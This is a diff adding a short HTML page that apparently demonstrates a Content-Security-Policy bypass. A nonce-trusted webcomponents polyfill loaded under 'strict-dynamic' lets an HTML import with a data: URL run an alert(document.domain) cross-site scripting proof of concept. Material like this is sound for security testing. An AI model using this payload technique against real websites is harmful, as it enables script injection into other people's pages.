@@ -1,0 +1,16 @@
+<!doctype html>
+<html lang="en">
+  <head>
+	<meta http-equiv=Content-Security-Policy content="
+  		object-src 'none';
+  		script-src 'nonce-random' 'unsafe-inline' 'unsafe-eval' 'strict-dynamic' https: http:;"
+  	>
+    <meta charset="utf-8">
+    <script nonce=random src="https://cdnjs.cloudflare.com/ajax/libs/webcomponentsjs/0.7.23/webcomponents-lite.min.js"></script>
+  </head>
+  <body>
+  	XSS
+    <link rel=import href="data:text/html,<script>alert(document.domain)</script>boo" >
+    /XSS
+  </body>
+</html>
